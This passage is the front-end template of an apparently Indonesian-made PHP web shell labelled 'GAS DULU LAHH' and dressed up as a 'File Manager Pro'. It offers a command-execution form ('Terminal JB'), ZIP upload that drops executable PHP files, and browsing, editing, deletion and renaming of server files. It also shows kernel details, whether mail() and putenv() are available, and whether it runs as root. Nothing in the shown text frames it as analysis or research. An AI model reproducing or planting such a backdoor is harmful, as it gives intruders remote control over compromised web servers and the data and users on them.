            padding: 20px 30px;
            text-align: center;
            color: var(--text-muted);
            border-top: 1px solid var(--border-color);
            background: var(--bg-tertiary);
        }

        @media (max-width: 768px) {
            .action-grid { grid-template-columns: 1fr; }
            .upload-form { flex-direction: column; }
            .file-input { width: 100%; }
            .btn { width: 100%; justify-content: center; }
            .header h1 { font-size: 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        
        <!-- HEADER SECTION -->
        <div class="header">
            <h1>
                <i class="fas fa-terminal"></i> GAS DULU LAHH
                <span class="terminal-badge">
                    <i class="fas fa-terminal"></i> Terminal JB
                </span>
                <span class="php-badge">
                    <i class="fab fa-php"></i> PHP Auto-Pilot
                </span>
                <?php if ($isRoot): ?>
                    <span class="root-badge">
                        <i class="fas fa-crown"></i> ROOT
                    </span>
                <?php endif; ?>
            </h1>
            <div class="system-info">
                <span class="info-item"><i class="fas fa-microchip"></i> Kernel: <?php echo (function_exists('php_uname') ? php_uname() : '???'); ?></span>
                <span class="info-item"><i class="fas fa-clock"></i> Time: <?php echo date('Y-m-d H:i:s'); ?></span>
                <span class="info-item"><i class="fas fa-globe"></i> Timezone: <?php echo $timezone; ?></span>
                <span class="info-item">
                    <i class="fas fa-envelope"></i> mail(): 
                    <span class="status-badge <?php echo function_exists('mail') ? 'status-on' : 'status-off'; ?>">
                        <i class="fas <?php echo function_exists('mail') ? 'fa-check-circle' : 'fa-times-circle'; ?>"></i>
                        <?php echo function_exists('mail') ? 'ON' : 'OFF'; ?>
                    </span>
                </span>
                <span class="info-item">
                    <i class="fas fa-cog"></i> putenv(): 
                    <span class="status-badge <?php echo function_exists('putenv') ? 'status-on' : 'status-off'; ?>">
                        <i class="fas <?php echo function_exists('putenv') ? 'fa-check-circle' : 'fa-times-circle'; ?>"></i>
                        <?php echo function_exists('putenv') ? 'ON' : 'OFF'; ?>
                    </span>
                </span>
                <?php if ($isRoot): ?>
                    <span class="info-item" style="background: #332200; color: #ffaa00; border-color: #665500;">
                        <i class="fas fa-crown"></i> ROOT Access
                    </span>
                <?php endif; ?>
            </div>
        </div>

        <!-- ALERT MESSAGES -->
        <?php foreach ($alertMessages as $alert): ?>
            <div class="alert alert-<?php echo $alert['type'] == 'success' ? 'success' : 'danger'; ?>">
                <i class="fas <?php echo $alert['type'] == 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'; ?>"></i>
                <?php echo $alert['message']; ?>
            </div>
        <?php endforeach; ?>

        <!-- NAVIGATION & ACTIONS -->
        <div class="navigation">
            
            <!-- PATH NAVIGATION -->
            <div class="path-navigation">
                <i class="fas fa-folder-open" style="color: var(--accent-success);"></i>
                <?php
                $directories = $expl(DIRECTORY_SEPARATOR, $currentDirectory);
                $currentPath = '';
                foreach ($directories as $index => $dir) {
                    $currentPath .= DIRECTORY_SEPARATOR . $dir;
                    echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
                }
                ?>
                <a href="?d=<?php echo x($scriptDirectory); ?>" class="home-link">
                    <i class="fas fa-home"></i> Home
                </a>
            </div>

            <!-- ACTION CARDS - 4 CARDS GRID -->
            <div class="action-grid">
                
                <!-- 📦 ZIP UPLOAD & EXTRACT - LANGSUNG JADI FILE PHP -->
                <div class="action-card zip-card">
                    <h3><i class="fas fa-file-archive"></i> 📦 Upload ZIP → Langsung Jadi File</h3>
                    <form method="post" enctype="multipart/form-data">
                        <input type="file" name="zipToUpload" accept=".zip" required>
                        <button type="submit" class="btn btn-zip">
                            <i class="fas fa-bolt"></i> Upload & Extract ke Current Dir
                        </button>
                        <small>
                            <i class="fab fa-php"></i> File PHP auto-aktif (0755) |
                            <i class="fas fa-folder-open"></i> Langsung ke folder ini
                        </small>
                    </form>
                </div>

                <!-- TERMINAL JB - (dulu Standard Command) -->
                <div class="action-card terminal-card">
                    <h3><i class="fas fa-terminal"></i> Terminal JB</h3>
                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
                        <input type="text" name="terminal_jb_cmd" placeholder="Enter command (ls, pwd, whoami, etc...)" required>
                        <button type="submit" class="btn btn-terminal">
                            <i class="fas fa-play"></i> Execute Command
                        </button>
                    </form>
                </div>

                <!-- Create Folder -->
                <div class="action-card">
                    <h3><i class="fas fa-folder-plus"></i> Create Folder</h3>
                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
                        <input type="text" name="folder_name" placeholder="Folder name..." required>
                        <button type="submit" class="btn btn-success"><i class="fas fa-plus"></i> Create Folder</button>
                    </form>
                </div>

                <!-- Create File -->
                <div class="action-card">
                    <h3><i class="fas fa-file-plus"></i> Create File</h3>
                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
                        <input type="text" name="file_name" placeholder="File name..." required>
                        <button type="submit" class="btn btn-success"><i class="fas fa-plus"></i> Create File</button>
                    </form>
                </div>
            </div>
        </div>

        <!-- UPLOAD AREA (Regular File Upload) -->
        <div class="upload-area">
            <h3><i class="fas fa-cloud-upload-alt"></i> Upload File (Non-ZIP)</h3>
            <form method="post" enctype="multipart/form-data" class="upload-form">
                <input type="file" name="fileToUpload" id="fileToUpload" class="file-input" required>
                <button type="submit" class="btn btn-primary" name="submit">
                    <i class="fas fa-upload"></i> Upload File
                </button>
            </form>
        </div>

        <!-- COMMAND RESULT DISPLAY -->
        <?php echo $viewCommandResult; ?>

        <!-- FOLDERS SECTION -->
        <?php if (!empty($folders)): ?>
            <div class="section-header folder-section">
                <i class="fas fa-folder"></i> Folders
                <span class="section-count"><?php echo count($folders); ?> items</span>
            </div>
            
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th><i class="fas fa-folder"></i> Folder Name</th>
                            <th><i class="fas fa-weight"></i> Size</th>
                            <th><i class="fas fa-calendar"></i> Modified</th>
                            <th><i class="fas fa-lock"></i> Permissions</th>
                            <th><i class="fas fa-eye"></i> View</th>
                            <th><i class="fas fa-trash"></i> Delete</th>
                            <th><i class="fas fa-edit"></i> Rename</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($folders as $v): 
                            $u = $currentDirectory . '/' . $v;
                            $permission = substr(sprintf('%o', fileperms($u)), -4);
                            $owner = function_exists('fileowner') ? fileowner($u) : null;
                            $isRootOwned = ($owner === 0);
                        ?>
                            <tr class="folder-row <?php echo $isRootOwned ? 'root-row' : ''; ?>">
                                <td class="item-name">
                                    <a href="?d=<?php echo x($currentDirectory . '/' . $v); ?>">
                                        <i class="fas fa-folder"></i> <?php echo $v; ?>
                                        <?php if ($isRootOwned): ?>
                                            <span class="root-badge-small"><i class="fas fa-crown"></i> ROOT</span>
                                        <?php endif; ?>
                                    </a>
                                </td>
                                <td>--</td>
                                <td><?php echo date('Y-m-d H:i:s', filemtime($u)); ?></td>
                                <td class="permission"><?php echo $permission; ?></td>
                                <td>
                                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
                                        <input type="hidden" name="view_file" value="<?php echo $htm($v); ?>">
                                        <button type="submit" class="btn-icon btn-view" title="View Contents">
                                            <i class="fas fa-eye"></i>
                                        </button>
                                    </form>
                                </td>
                                <td>
                                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>" 
                                          onsubmit="return confirm('Are you sure you want to delete folder <?php echo $v; ?>?');">
                                        <input type="hidden" name="delete_file" value="<?php echo $htm($v); ?>">
                                        <button type="submit" class="btn-icon btn-delete" title="Delete">
                                            <i class="fas fa-trash"></i>
                                        </button>
                                    </form>
                                </td>
                                <td>
                                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>" class="rename-form">
                                        <input type="hidden" name="old_name" value="<?php echo $htm($v); ?>">
                                        <input type="text" name="new_name" placeholder="New name" required>
                                        <button type="submit" name="rename_item" class="btn-icon btn-rename" title="Rename">
                                            <i class="fas fa-pencil-alt"></i>
                                        </button>
                                    </form>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>

        <!-- FILES SECTION -->
        <?php if (!empty($files)): ?>
            <div class="section-header file-section">
                <i class="fas fa-file"></i> Files
                <span class="section-count"><?php echo count($files); ?> items</span>
            </div>
            
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th><i class="fas fa-file"></i> File Name</th>
                            <th><i class="fas fa-weight"></i> Size</th>
                            <th><i class="fas fa-calendar"></i> Modified</th>
                            <th><i class="fas fa-lock"></i> Permissions</th>
                            <th><i class="fas fa-eye"></i> View/Edit</th>
                            <th><i class="fas fa-trash"></i> Delete</th>
                            <th><i class="fas fa-edit"></i> Rename</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($files as $v): 
                            $u = $currentDirectory . '/' . $v;
                            $permission = substr(sprintf('%o', fileperms($u)), -4);
                            $size = filesize($u);
                            $sizeFormatted = $size < 1024 ? $size . ' B' : 
                                            ($size < 1048576 ? round($size/1024, 2) . ' KB' : 
                                            round($size/1048576, 2) . ' MB');
                            $owner = function_exists('fileowner') ? fileowner($u) : null;
                            $isRootOwned = ($owner === 0);
                            $isPhp = (strtolower(pathinfo($v, PATHINFO_EXTENSION)) == 'php');
                        ?>
                            <tr class="file-row <?php echo $isRootOwned ? 'root-row' : ''; ?> <?php echo $isPhp ? 'php-file' : ''; ?>">
                                <td class="item-name">
                                    <a href="?d=<?php echo x($currentDirectory); ?>&f=<?php echo x($v); ?>">
                                        <i class="fas <?php echo $isPhp ? 'fab fa-php' : 'fa-file'; ?>"></i> <?php echo $v; ?>
                                        <?php if ($isRootOwned): ?>
                                            <span class="root-badge-small"><i class="fas fa-crown"></i> ROOT</span>
                                        <?php endif; ?>
                                        <?php if ($isPhp): ?>
                                            <span class="php-badge-small"><i class="fab fa-php"></i> PHP</span>
                                        <?php endif; ?>
                                    </a>
                                </td>
                                <td><?php echo $sizeFormatted; ?></td>
                                <td><?php echo date('Y-m-d H:i:s', filemtime($u)); ?></td>
                                <td class="permission"><?php echo $permission; ?></td>
                                <td>
                                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
                                        <input type="hidden" name="view_file" value="<?php echo $htm($v); ?>">
                                        <button type="submit" class="btn-icon btn-view" title="View/Edit">
                                            <i class="fas fa-eye"></i>
                                        </button>
                                    </form>
                                </td>
                                <td>
                                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>" 
                                          onsubmit="return confirm('Are you sure you want to delete file <?php echo $v; ?>?');">
                                        <input type="hidden" name="delete_file" value="<?php echo $htm($v); ?>">
                                        <button type="submit" class="btn-icon btn-delete" title="Delete">
                                            <i class="fas fa-trash"></i>
                                        </button>
                                    </form>
                                </td>
                                <td>
                                    <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>" class="rename-form">
                                        <input type="hidden" name="old_name" value="<?php echo $htm($v); ?>">
                                        <input type="text" name="new_name" placeholder="New name" required>
                                        <button type="submit" name="rename_item" class="btn-icon btn-rename" title="Rename">
                                            <i class="fas fa-pencil-alt"></i>
                                        </button>
                                    </form>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>

        <!-- EMPTY STATE -->
        <?php if (empty($folders) && empty($files)): ?>
            <div class="empty-state">
                <i class="fas fa-folder-open"></i>
                <h3>Empty Directory</h3>
                <p>No files or folders found in this directory</p>
            </div>
        <?php endif; ?>

        <!-- FOOTER -->
        <div class="footer">
            <small>
                <i class="fas fa-shield-alt"></i> File Manager Pro &copy; 2024 | 
                <i class="fas fa-terminal"></i> Terminal JB Active |
                <i class="fas fa-file-archive"></i> ZIP → Files (No Folders) |
                <i class="fab fa-php"></i> PHP Auto 0755 |
                <?php if ($isRoot): ?>
                    <span style="color: #ffaa00;"><i class="fas fa-crown"></i> ROOT</span>
                <?php endif; ?>
            </small>
        </div>
    </div>
</body>
</html>
